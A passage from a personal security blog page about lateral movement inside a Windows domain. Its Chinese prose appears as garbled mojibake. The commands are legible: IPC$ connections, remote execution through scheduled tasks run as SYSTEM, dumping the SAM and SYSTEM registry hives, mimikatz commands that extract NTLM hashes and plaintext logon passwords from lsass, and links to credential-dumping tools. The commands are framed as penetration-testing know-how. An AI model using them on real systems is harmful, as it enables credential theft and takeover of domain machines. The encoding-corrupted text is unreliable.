<!DOCTYPE html>
<html lang="zh-CN">

<head>

  <!-- Minima -->
  <!-- Hexo theme created by @adisaktijrs -->

  <!-- Basic Page Needs
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <meta charset="utf-8">

  
  <title>åŸŸå†…æ¨ªå‘ç§»åŠ¨</title>
  
  <link rel="canonical" href="https://r0sew1thh3r.github.io/2022/08/26/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1/">
  
  <meta name="description" content="åŸŸå†…æ¨ªå‘ç§»åŠ¨æŠ€æœ¯å°±æ˜¯åœ¨å¤æ‚çš„å†…ç½‘æ”»å‡»ä¸­è¢«å¹¿æ³›ä½¿ç”¨çš„ä¸€ç§æŠ€æœ¯ï¼Œå°¤å…¶æ˜¯åœ¨é«˜çº§æŒç»­å¨èƒ(APT)ä¸­ã€‚æ”»å‡»è€…ä¼šåˆ©ç”¨è¯¥æŠ€æœ¯ï¼Œä»¥è¢«æ”»é™·çš„ç³»ç»Ÿä¸ºè·³æ¿ï¼Œè®¿é—®å…¶ä»–åŸŸå†…ä¸»æœºï¼Œæ‰©å¤§èµ„äº§èŒƒå›´ï¼ˆåŒ…æ‹¬è·³æ¿æœºå™¨ä¸­çš„æ–‡æ¡£å’Œå­˜å‚¨çš„å‡­è¯ï¼Œä»¥åŠé€šè¿‡è·³æ¿æœºå™¨è¿æ¥çš„æ•°æ®åº“ã€åŸŸæ§åˆ¶å™¨æˆ–å…¶ä»–é‡è¦èµ„äº§ï¼‰ã€‚ æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æ‹¿ä¸‹åŸŸæ§ã€‚ å¸¸ç”¨Windo">
  
  
  <meta name="author" content="R0seW1thH3r">
  
  
  
  <meta property="og:site_name" content="R0seW1thH3r" />
  <meta property="og:type" content="article" />
  <meta property="og:title" content="åŸŸå†…æ¨ªå‘ç§»åŠ¨" />
  
  <meta property="og:description" content="åŸŸå†…æ¨ªå‘ç§»åŠ¨æŠ€æœ¯å°±æ˜¯åœ¨å¤æ‚çš„å†…ç½‘æ”»å‡»ä¸­è¢«å¹¿æ³›ä½¿ç”¨çš„ä¸€ç§æŠ€æœ¯ï¼Œå°¤å…¶æ˜¯åœ¨é«˜çº§æŒç»­å¨èƒ(APT)ä¸­ã€‚æ”»å‡»è€…ä¼šåˆ©ç”¨è¯¥æŠ€æœ¯ï¼Œä»¥è¢«æ”»é™·çš„ç³»ç»Ÿä¸ºè·³æ¿ï¼Œè®¿é—®å…¶ä»–åŸŸå†…ä¸»æœºï¼Œæ‰©å¤§èµ„äº§èŒƒå›´ï¼ˆåŒ…æ‹¬è·³æ¿æœºå™¨ä¸­çš„æ–‡æ¡£å’Œå­˜å‚¨çš„å‡­è¯ï¼Œä»¥åŠé€šè¿‡è·³æ¿æœºå™¨è¿æ¥çš„æ•°æ®åº“ã€åŸŸæ§åˆ¶å™¨æˆ–å…¶ä»–é‡è¦èµ„äº§ï¼‰ã€‚ æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æ‹¿ä¸‹åŸŸæ§ã€‚ å¸¸ç”¨Windo">
  
  <meta property="og:url" content="https://r0sew1thh3r.github.io/2022/08/26/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1/" />

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="åŸŸå†…æ¨ªå‘ç§»åŠ¨">
  
  <meta name="twitter:description" content="åŸŸå†…æ¨ªå‘ç§»åŠ¨æŠ€æœ¯å°±æ˜¯åœ¨å¤æ‚çš„å†…ç½‘æ”»å‡»ä¸­è¢«å¹¿æ³›ä½¿ç”¨çš„ä¸€ç§æŠ€æœ¯ï¼Œå°¤å…¶æ˜¯åœ¨é«˜çº§æŒç»­å¨èƒ(APT)ä¸­ã€‚æ”»å‡»è€…ä¼šåˆ©ç”¨è¯¥æŠ€æœ¯ï¼Œä»¥è¢«æ”»é™·çš„ç³»ç»Ÿä¸ºè·³æ¿ï¼Œè®¿é—®å…¶ä»–åŸŸå†…ä¸»æœºï¼Œæ‰©å¤§èµ„äº§èŒƒå›´ï¼ˆåŒ…æ‹¬è·³æ¿æœºå™¨ä¸­çš„æ–‡æ¡£å’Œå­˜å‚¨çš„å‡­è¯ï¼Œä»¥åŠé€šè¿‡è·³æ¿æœºå™¨è¿æ¥çš„æ•°æ®åº“ã€åŸŸæ§åˆ¶å™¨æˆ–å…¶ä»–é‡è¦èµ„äº§ï¼‰ã€‚ æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æ‹¿ä¸‹åŸŸæ§ã€‚ å¸¸ç”¨Windo">
  
  
  
  
  <meta name="twitter:url" content="https://r0sew1thh3r.github.io/2022/08/26/%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E5%BE%A1/" />

  <!-- Mobile Specific Metas
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- Preload fonts
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <link rel="preload" href="/fonts/dm-serif-display-v4-latin-regular.woff2" as="font" type="font/woff2" crossorigin>
  <link rel="preload" href="/fonts/inter-v2-latin-regular.woff2" as="font" type="font/woff2" crossorigin>

  <!-- CSS
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  
<link rel="stylesheet" href="/css/normalize.css">

  
<link rel="stylesheet" href="/css/skeleton.css">

  
<link rel="stylesheet" href="/css/custom.css">

  
<link rel="stylesheet" href="/css/prism-dark.css">

  
<link rel="stylesheet" href="/css/prism-line-numbers.css">

  <!-- User css -->
  
  
<link rel="stylesheet" href="/css/user.css">

  

  <!-- Favicon
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <link rel="icon" type="image/png" href="/images/favicon.png">

  <!-- Custom Theme Color Style
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  <style>
  a:not(.icon) {
    text-decoration-color: #0FA0CE;
    background-image: linear-gradient(
      to bottom,
      rgba(0, 0, 0, 0) 50%,
      #0FA0CE 50%
    );
  }
  blockquote {
    border-left: 8px solid #0FA0CE;
  }
  .nanobar .bar {
    background: #0FA0CE;
  }
  .button.button-primary:hover,
  button.button-primary:hover,
  input[type="submit"].button-primary:hover,
  input[type="reset"].button-primary:hover,
  input[type="button"].button-primary:hover,
  .button.button-primary:focus,
  button.button-primary:focus,
  input[type="submit"].button-primary:focus,
  input[type="reset"].button-primary:focus,
  input[type="button"].button-primary:focus {
    background-color: #0FA0CE;
    border-color: #0FA0CE;
  }
  input[type="email"]:focus,
  input[type="number"]:focus,
  input[type="search"]:focus,
  input[type="text"]:focus,
  input[type="tel"]:focus,
  input[type="url"]:focus,
  input[type="password"]:focus,
  textarea:focus,
  select:focus {
    border: 1px solid #0FA0CE;
  }
</style>

  <!-- Google Analytics (With Privacy Settings On)
  â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ -->
  

  
  <script src="/js/pic.min.js" defer></script>
  

  

<meta name="generator" content="Hexo 6.1.0"></head>

<body>
  <div class="container">
    <div class="row">
      <div>

        <div class="row">
  <div class="two columns" style="max-width: 50px">
    <h1 class="mt-2 mode">
      <div onclick=setDarkMode(true) id="darkBtn">ğŸŒ‘</div>
      <div onclick=setDarkMode(false) id="lightBtn" class=hidden>â˜€ï¸</div>
      <script >
        if (localStorage.getItem('preferredTheme') == 'dark') {
          setDarkMode(true)
        }
        function setDarkMode(isDark) {
          var darkBtn = document.getElementById('darkBtn')
          var lightBtn = document.getElementById('lightBtn')
          if (isDark) {
            lightBtn.style.display = "block"
            darkBtn.style.display = "none"
            localStorage.setItem('preferredTheme', 'dark');
          } else {
            lightBtn.style.display = "none"
            darkBtn.style.display = "block"
            localStorage.removeItem('preferredTheme');
          }
          document.body.classList.toggle("darkmode");
        }
      </script>
    </h1>
  </div>

  <div class="six columns ml-1">
    <h1 class="mt-2">
      Hi Folks.
    </h1>
  </div>

  <div class="twelve columns">
    <div class="row">
      <div class="nine columns left">
        <a href="/">Home</a>
        
          
          <a href="/tags" class="ml">Tags</a>
          
        
          
          <a href="/about" class="ml">About</a>
          
        
        
      </div>
    </div>
    <hr style="margin-bottom: 2.6rem">
  </div>
</div>
<link rel="stylesheet" href="/js/prism/prism.css">
        <div class="trans">
            <h2>åŸŸå†…æ¨ªå‘ç§»åŠ¨</h2>

  <p>åŸŸå†…æ¨ªå‘ç§»åŠ¨æŠ€æœ¯å°±æ˜¯åœ¨å¤æ‚çš„å†…ç½‘æ”»å‡»ä¸­è¢«å¹¿æ³›ä½¿ç”¨çš„ä¸€ç§æŠ€æœ¯ï¼Œå°¤å…¶æ˜¯åœ¨é«˜çº§æŒç»­å¨èƒ(APT)ä¸­ã€‚æ”»å‡»è€…ä¼šåˆ©ç”¨è¯¥æŠ€æœ¯ï¼Œä»¥è¢«æ”»é™·çš„ç³»ç»Ÿä¸ºè·³æ¿ï¼Œè®¿é—®å…¶ä»–åŸŸå†…ä¸»æœºï¼Œæ‰©å¤§èµ„äº§èŒƒå›´ï¼ˆåŒ…æ‹¬è·³æ¿æœºå™¨ä¸­çš„æ–‡æ¡£å’Œå­˜å‚¨çš„å‡­è¯ï¼Œä»¥åŠé€šè¿‡è·³æ¿æœºå™¨è¿æ¥çš„æ•°æ®åº“ã€åŸŸæ§åˆ¶å™¨æˆ–å…¶ä»–é‡è¦èµ„äº§ï¼‰ã€‚</p>
<p>æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯<strong>æ‹¿ä¸‹åŸŸæ§</strong>ã€‚</p>
<h1 id="å¸¸ç”¨Windowsè¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤"><a href="#å¸¸ç”¨Windowsè¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤" class="headerlink" title="å¸¸ç”¨Windowsè¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤"></a>å¸¸ç”¨Windowsè¿œç¨‹è¿æ¥å’Œç›¸å…³å‘½ä»¤</h1><p>åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œæ‹¿åˆ°ç›®æ ‡æœºå™¨çš„æ˜æ–‡å¯†ç æˆ–è€…NTLM Hashåï¼Œå¯ä»¥é€šè¿‡PTH(Pass the Hash)æ–¹æ³•ï¼Œå°†æ•£åˆ—å€¼æˆ–æ˜æ–‡å¯†ç å‘åˆ°ç›®æ ‡æœºå™¨ä¸­è¿›è¡ŒéªŒè¯ï¼ŒéªŒè¯æˆåŠŸåå¯ä»¥å»ºç«‹è¿æ¥ã€‚ä¸ç›®æ ‡æœºå™¨å»ºç«‹è¿æ¥åï¼Œå¯ä»¥ä½¿ç”¨ç›¸å…³æ–¹æ³•åœ¨è¿œç¨‹windows æ“ä½œç³»ç»Ÿä¸­<strong>æ‰§è¡Œå‘½ä»¤</strong>ã€‚</p>
<p>åœ¨å¤šå±‚ä»£ç†ç¯å¢ƒè¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œç”±äºç½‘ç»œæ¡ä»¶æ¯”è¾ƒå·®ï¼Œæ— æ³•ä½¿ç”¨å›¾å½¢åŒ–ç•Œé¢è¿æ¥ä¸»æœºã€‚æ­¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<strong>å‘½ä»¤è¡Œ</strong>çš„æ–¹å¼è¿æ¥ä¸»æœºï¼ˆæœ€å¥½ä½¿ç”¨windowsè‡ªå¸¦çš„æ–¹æ³•å¯¹è¿œç¨‹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œå‘½ä»¤è¡Œä¸‹çš„æ“ä½œï¼‰ã€‚</p>
<h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>windowsä¸Šæœ‰ä¸€ä¸ªæ–‡ä»¶å…±äº«çš„åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯<strong>SMBæœåŠ¡</strong>ã€‚æˆ‘ä»¬éšä¾¿é€‰æ‹©ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå³é”®æŸ¥çœ‹å±æ€§ï¼Œåœ¨ä¸Šé¢å°±å¯ä»¥çœ‹åˆ°ä¸€ä¸ªå…±äº«çš„åŠŸèƒ½ã€‚å¼€å¯è¿™ä¸ªåŠŸèƒ½éœ€è¦æˆ‘ä»¬å¡«å†™ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼Œè€Œè¿™ä¸ªç”¨æˆ·åå’Œå¯†ç å°±æ˜¯å…¶å®ƒè®¡ç®—æœºæƒ³è¦è®¿é—®ä½ è¿™ä¸ªå…±äº«æ–‡ä»¶å¤¹å†…å®¹æ—¶ï¼Œéœ€è¦è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç ã€‚è¿æ¥æ–¹<code>win+r</code>è¾“å…¥<code>\\ip</code> å°±å¯ä»¥è¿æ¥äº†ã€‚</p>
<p>è¿æ¥æˆåŠŸåï¼Œåœ¨å‘½ä»¤è¡Œè¾“å…¥<code>net share</code>æŸ¥çœ‹å…±äº«çš„æ–‡ä»¶å¤¹ï¼Œå‘ç°é™¤äº†æˆ‘ä»¬é€‰æ‹©çš„é‚£ä¸ªå…±äº«æ–‡ä»¶å¤¹å¤–ï¼Œè¿˜æœ‰C$ã€D$ã€IPC$ç­‰ï¼Œè¿™äº›éƒ½æ˜¯windows<strong>é»˜è®¤å¼€å¯</strong>çš„ã€‚C$å°±æ˜¯å…±äº«çš„cç›˜æ‰€æœ‰æ–‡ä»¶ï¼ŒD$å°±æ˜¯Dç›˜æ‰€æœ‰æ–‡ä»¶ï¼Œè€Œ<strong>IPC$<strong>çš„ä½œç”¨èŒƒå›´æ›´å¤§ä¸€äº›ï¼Œå®ƒæ˜¯æœåŠ¡å™¨é—´è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ï¼šå¯ä»¥æšä¸¾å¸å·ã€å…±äº«æ–‡ä»¶ã€</strong>æ‰§è¡Œç³»ç»ŸæŒ‡ä»¤</strong>ã€‚</p>
<p>é€šè¿‡ipc$,å¯ä»¥ä¸ç›®æ ‡æœºå™¨å»ºç«‹è¿æ¥ã€‚åˆ©ç”¨è¿™ä¸ªè¿æ¥ï¼Œä¸ä»…å¯ä»¥è®¿é—®ï¼Œç›®å½•æœºå™¨ä¸­çš„æ–‡ä»¶ï¼Œè¿›è¡Œä¸Šä¼ ï¼Œä¸‹è½½ç­‰æ“ä½œï¼Œè¿˜å¯ä»¥åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿è¡Œå…¶ä»–å‘½ä»¤ï¼Œä»¥è·å–ç›®æ ‡æœºå™¨çš„ç›®å½•ç»“æ„ã€ç”¨æˆ·åˆ—è¡¨ç­‰ä¿¡æ¯ã€‚</p>
<p>åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨å‘½ä»¤è¡Œçš„æ–¹å¼å»ºç«‹ipc$è¿æ¥ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">net use \\192.168.1.2\ipc$ &quot;å¯†ç &quot; &#x2F;user:ç”¨æˆ·å<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä½¿ç”¨<code>net use</code>å‘½ä»¤æŸ¥çœ‹å½“å‰çš„è¿æ¥ã€‚</p>
<p><strong>ipc$çš„åˆ©ç”¨æ¡ä»¶</strong></p>
<ul>
<li>å¼€å¯äº†139ã€445ç«¯å£</li>
<li>ç®¡ç†å‘˜å¼€å¯äº†é»˜è®¤å…±äº«</li>
</ul>
<h2 id="ä½¿ç”¨Windowsè‡ªå¸¦çš„å·¥å…·è·å–ä¸»æœºä¿¡æ¯"><a href="#ä½¿ç”¨Windowsè‡ªå¸¦çš„å·¥å…·è·å–ä¸»æœºä¿¡æ¯" class="headerlink" title="ä½¿ç”¨Windowsè‡ªå¸¦çš„å·¥å…·è·å–ä¸»æœºä¿¡æ¯"></a>ä½¿ç”¨Windowsè‡ªå¸¦çš„å·¥å…·è·å–ä¸»æœºä¿¡æ¯</h2><p>å»ºç«‹ipc$è¿æ¥å</p>
<pre class="line-numbers language-none"><code class="language-none">net time \\192.168.100.190	#æŸ¥çœ‹è¿œç¨‹æœºå™¨çš„ç³»ç»Ÿæ—¶é—´
dir \\192.168.100.190\c$\					#æŸ¥çœ‹æ–‡ä»¶åˆ—è¡¨
copy \\192.168.100.190\c$\1.bat 1.bat 		#ä¸‹è½½æ–‡ä»¶
copy 1.bat \\192.168.100.190\c$				#ä¸Šä¼ æ–‡ä»¶
net use \\192.168.100.190\IPC$ &#x2F;del			#åˆ é™¤IPCè¿æ¥
net view 192.168.100.190					#æŸ¥çœ‹å¯¹æ–¹å…±äº«
tasklist &#x2F;S 192.168.100.190 &#x2F;U ç”¨æˆ·å &#x2F;P å¯†ç 	#åˆ—å‡ºè¿œç¨‹ä¸»æœºä¸Šè¿è¡Œçš„è¿›ç¨‹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h2><p>1ã€<strong>at</strong>å‘½ä»¤æ˜¯windowsè‡ªå¸¦çš„ç”¨äºåˆ›å»ºä»»åŠ¡çš„å‘½ä»¤</p>
<p>ç‰ˆæœ¬ï¼š<code>&lt;Windows2008</code></p>
<p>å»ºç«‹ipcè¿æ¥ï¼Œç„¶åæŠŠæ‰§è¡Œæ–‡ä»¶copyä¸Šå»ï¼Œå†ä½¿ç”¨atå‘½ä»¤æ·»åŠ è®¡åˆ’ä»»åŠ¡ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">at \\192.168.100.190\ 11:30 C:\hh.bat	#åœ¨192.168.100.190æœºå™¨ä¸Š11:30æ‰§è¡Œæ–‡ä»¶C:\hh.bat
at \\192.168.100.190 1 &#x2F;delete	#1ä¸ºè®¡åˆ’ä»»åŠ¡çš„ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ä½¿ç”¨atè¿œç¨‹æ‰§è¡Œå‘½ä»¤åï¼Œå…ˆå°†æ‰§è¡Œç»“æœå†™å…¥æœ¬åœ°æ–‡ä»¶ï¼Œå†ä½¿ç”¨typeå‘½ä»¤è¯»å–è¯¥æ–‡æœ¬æ–‡ä»¶ã€‚</p>
<p>2ã€<strong>schtasks</strong>å‘½ä»¤æ˜¯windowsè‡ªå¸¦çš„ç”¨äºåˆ›å»ºä»»åŠ¡çš„å‘½ä»¤</p>
<p><code>&gt;=windows2008</code></p>
<p>å»ºç«‹ipcè¿æ¥ï¼Œç„¶åæŠŠæ‰§è¡Œæ–‡ä»¶copyä¸Šå»ï¼Œå†ä½¿ç”¨schtaskså‘½ä»¤æ·»åŠ è®¡åˆ’ä»»åŠ¡ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">#åœ¨10.1.1.1åˆ›å»ºä»»åŠ¡åä¸ºadduserï¼Œæ¯å¤©æ‰§è¡Œçš„ï¼Œæ–‡ä»¶è·¯å¾„ä¸ºC:\add.batçš„ä»»åŠ¡
schtasks &#x2F;create &#x2F;s 10.1.1.1 &#x2F;ru &quot;SYSTEM&quot; &#x2F;tn adduser &#x2F;sc DAILY &#x2F;tr C:\add.bat &#x2F;F

#è¿è¡Œadduserä»»åŠ¡
schtasks &#x2F;run &#x2F;s 10.1.1.1 &#x2F;tn adduser &#x2F;i

#åˆ é™¤adduserä»»åŠ¡
schtasks &#x2F;delete &#x2F;s 10.1.1.1 &#x2F;tn adduser &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="Windowsç³»ç»Ÿæ•£åˆ—å€¼è·å–"><a href="#Windowsç³»ç»Ÿæ•£åˆ—å€¼è·å–" class="headerlink" title="Windowsç³»ç»Ÿæ•£åˆ—å€¼è·å–"></a>Windowsç³»ç»Ÿæ•£åˆ—å€¼è·å–</h1><h2 id="LM-Hashå’ŒNTLM-Hash"><a href="#LM-Hashå’ŒNTLM-Hash" class="headerlink" title="LM Hashå’ŒNTLM Hash"></a>LM Hashå’ŒNTLM Hash</h2><p>åœ¨åŸŸç¯å¢ƒä¸­ï¼Œç”¨æˆ·ä¿¡æ¯å‚¨å­˜åœ¨ntds.ditä¸­ï¼ŒåŠ å¯†åä¸ºæ•£åˆ—å€¼ã€‚</p>
<p>Windowsæ“ä½œç³»ç»Ÿä¸­çš„å¯†ç ä¸€èˆ¬ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œä¸€éƒ¨åˆ†ä¸ºLM Hashï¼Œå¦ä¸€éƒ¨åˆ†ä¸ºNTLM Hashã€‚Hashç»“æ„å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>username:RID:LM-HASH:NT-HASH</p>
</blockquote>
<h2 id="å•æœºå¯†ç æŠ“å–"><a href="#å•æœºå¯†ç æŠ“å–" class="headerlink" title="å•æœºå¯†ç æŠ“å–"></a>å•æœºå¯†ç æŠ“å–</h2><p>æƒ³è¦åœ¨windowsæ“ä½œç³»ç»Ÿä¸­æŠ“å–æ•£åˆ—å€¼æˆ–æ˜æ–‡å¯†ç ï¼Œå¿…é¡»å°†æƒé™æå‡è‡³Systemã€‚</p>
<p>æœ¬åœ°ç”¨æˆ·åã€æ•£åˆ—å€¼å’Œå…¶ä»–å®‰å…¨éªŒè¯ä¿¡æ¯éƒ½ä¿å­˜åœ¨SAMæ–‡ä»¶ä¸­ã€‚lsass.exeè¿›ç¨‹ç”¨äºå®ç°Windowsçš„å®‰å…¨ç­–ç•¥ã€‚å¯ä»¥<strong>ä½¿ç”¨å·¥å…·å°†æ•£åˆ—å€¼å’Œæ˜æ–‡å¯†ç ä»å†…å­˜ä¸­çš„lsass.exeè¿›ç¨‹æˆ–SAMæ–‡ä»¶ä¸­å¯¼å‡º</strong>ã€‚</p>
<h3 id="GetPass"><a href="#GetPass" class="headerlink" title="GetPass"></a>GetPass</h3><p>å·¥å…·ä¸‹è½½é“¾æ¥ï¼š<a href="https://link.zhihu.com/?target=https://bbs.pediy.com/thread-163383.htm">https://link.zhihu.com/?target=https%3A//bbs.pediy.com/thread-163383.htm</a></p>
<p>æ‰¾åˆ°å¯¹åº”æ“ä½œç³»ç»Ÿä½çš„exeæ–‡ä»¶ï¼Œè¿è¡Œå³å¯å¾—åˆ°æ˜æ–‡å¯†ç ã€‚</p>
<h3 id="PwDump7"><a href="#PwDump7" class="headerlink" title="PwDump7"></a>PwDump7</h3><p>å·¥å…·ä¸‹è½½é“¾æ¥ï¼š<a href="https://link.zhihu.com/?target=https://www.tarasco.org/security/pwdump_7/">https://link.zhihu.com/?target=https%3A//www.tarasco.org/security/pwdump_7/</a></p>
<p>éœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œè¿è¡Œå¾—åˆ°æ‰€æœ‰è´¦æˆ·çš„NTLM Hashã€‚å¯ä»¥é€šè¿‡å½©è™¹è¡¨æ¥ç ´è§£æ•£åˆ—å€¼ã€‚å¦‚æœæ— æ³•é€šè¿‡å½©è™¹è¡¨æ¥ç ´è§£ï¼Œå¯ä»¥ä½¿ç”¨å“ˆå¸Œä¼ é€’çš„æ–¹æ³•è¿›è¡Œæ¨ªå‘æ¸—é€æµ‹è¯•ã€‚</p>
<h3 id="é€šè¿‡SAMå’ŒSystemæ–‡ä»¶æŠ“å–å¯†ç "><a href="#é€šè¿‡SAMå’ŒSystemæ–‡ä»¶æŠ“å–å¯†ç " class="headerlink" title="é€šè¿‡SAMå’ŒSystemæ–‡ä»¶æŠ“å–å¯†ç "></a>é€šè¿‡SAMå’ŒSystemæ–‡ä»¶æŠ“å–å¯†ç </h3><p>1ã€å¯¼å‡ºSAMæ–‡ä»¶å’ŒSystemæ–‡ä»¶</p>
<p>æ— å·¥å…·å¯¼å‡ºSAMæ–‡ä»¶ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰ï¼Œå‘½ä»¤ï¼š</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">#é€šè¿‡regçš„saveé€‰é¡¹å°†æ³¨å†Œè¡¨çš„SAMã€Systemæ–‡ä»¶å¯¼å‡ºåˆ°æœ¬åœ°ç£ç›˜
reg save hklm\sam sam.hive
reg save hklm\system system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>2ã€ä½¿ç”¨mimikatzè¯»å–SAMå’ŒSystemæ–‡ä»¶è·å¾—NTLM Hash </p>
<p>å·¥å…·ä¸‹è½½é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p>
<p>â‘ å¯ä»¥æŠŠsam.hiveå’Œsystem.hiveä¸‹è½½åˆ°æœ¬æœºï¼Œç„¶åæŠŠsam.hiveå’Œsystem.hiveæ–‡ä»¶æ”¾åˆ°ä¸mimikatzåŒä¸€ç›®å½•ä¸‹ã€‚</p>
<p>è¿è¡Œmimikatzï¼Œè¾“å…¥å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz
lsadump::sam &#x2F;sam:sam.hive &#x2F;system:system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>å¾—åˆ°hash</p>
<p>â‘¡ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡mimikatzè¯»å–æœ¬åœ°SAMæ–‡ä»¶ï¼Œä½†æ˜¯è¦è€ƒè™‘mimikatzè¢«ç›®æ ‡æœºå™¨æ€æ‰çš„é—®é¢˜ã€‚</p>
<p>å¯¼å‡ºhashä¸‰éƒ¨æ›²ï½</p>
<pre class="line-numbers language-none"><code class="language-none">ç¬¬ä¸€æ­¥ï¼šprivilege::debug
ç¬¬äºŒæ­¥ï¼štoken::elevate	ï¼ˆææƒï¼‰
ç¬¬ä¸‰æ­¥ï¼šlsadump::sam	ï¼ˆå¯¼å‡ºhashï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>



<h3 id="ä½¿ç”¨mimikatzåœ¨çº¿è¯»å–SAMæ–‡ä»¶"><a href="#ä½¿ç”¨mimikatzåœ¨çº¿è¯»å–SAMæ–‡ä»¶" class="headerlink" title="ä½¿ç”¨mimikatzåœ¨çº¿è¯»å–SAMæ–‡ä»¶"></a>ä½¿ç”¨mimikatzåœ¨çº¿è¯»å–SAMæ–‡ä»¶</h3><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h3 id="ä½¿ç”¨mimikatzç¦»çº¿è¯»å–lsass-dmpæ–‡ä»¶"><a href="#ä½¿ç”¨mimikatzç¦»çº¿è¯»å–lsass-dmpæ–‡ä»¶" class="headerlink" title="ä½¿ç”¨mimikatzç¦»çº¿è¯»å–lsass.dmpæ–‡ä»¶"></a>ä½¿ç”¨mimikatzç¦»çº¿è¯»å–lsass.dmpæ–‡ä»¶</h3><p>ä½¿ç”¨Procdumpå¯¼å‡ºlsass.dmpæ–‡ä»¶ï¼Œç„¶åé€šè¿‡mimikatzè¯»å–lsass.dmpã€‚lsass.dmpå¯¼å‡ºåå¯ä»¥æ”¾åˆ°æœ¬åœ°ï¼Œé¿å…mimikatzè¢«æ€ã€‚</p>
